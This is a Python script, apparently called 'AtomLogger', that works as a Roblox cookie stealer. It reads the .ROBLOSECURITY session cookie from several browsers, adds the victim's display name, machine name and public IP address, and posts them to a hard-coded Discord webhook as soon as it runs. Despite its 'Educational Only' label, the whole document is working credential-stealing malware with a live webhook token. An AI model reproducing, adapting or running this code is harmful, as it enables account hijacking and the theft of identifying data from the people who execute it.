import browser_cookie3, requests, re, os

# Settings - Webhook
webhook = 'https://discord.com/api/webhooks/1353119204353642598/bXRRQByx7C8vyFp51qH05FCBMo-jM5qD4Wv9rMRXm58MEDkyQh675CPkQYxum1guE4Sy'
avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
botName = 'Bloxcord | cookies'

# Functions
def sendWebhook(message):
    requests.post(webhook, data = f'username={botName}&avatar_url={avatarUrl}&content={message}', headers = {'content-type':"application/x-www-form-urlencoded"})

def scrapeInfo(cookies):
    request = requests.get('https://www.roblox.com', cookies=cookies)
    displayName = re.findall("displayname=(.*) data-isunder13", request.content.decode('UTF-8'))
    return displayName[0] if displayName else "Unknown"

def getIPAddress():
    request = requests.get('https://ip4.seeip.org/')
    return request.content.decode('UTF-8')

def cookieLogger():
    data = []

    for browser in ["firefox", "edge", "opera", "chromium"]:
        try:
            cookies = getattr(browser_cookie3, browser)(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data
        except:
            pass
    return None

def AtomLogger():
    cookies = cookieLogger()
    if not cookies:
        return  # No cookies found

    machineName = os.getenv('COMPUTERNAME')

    message = '```' + 'AtomLogger | Educational Only\n'
    message += f'\nName: {scrapeInfo(cookies[0])} \nCookie:\n{cookies[1]} \n\nMachine Name: {machineName} \nIP Address: {getIPAddress()}' + '```'
    sendWebhook(message)

# Execute Immediately When Script Runs
if __name__ == '__main__':
    AtomLogger()
